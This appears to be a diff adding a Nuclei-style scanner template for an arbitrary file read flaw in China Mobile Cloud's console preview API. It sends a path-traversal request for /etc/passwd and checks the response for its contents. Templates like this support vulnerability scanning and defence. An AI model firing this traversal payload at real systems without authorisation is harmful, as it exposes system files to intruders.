@@ -1,0 +1,29 @@
+id: poc-yaml-ecloud-console-preview-anyfile-read
+info:
+  name: 中国移动云控制台 preview 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "image/jpg"
+        part: header
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
+      - type: status
+        status:
+          - 200
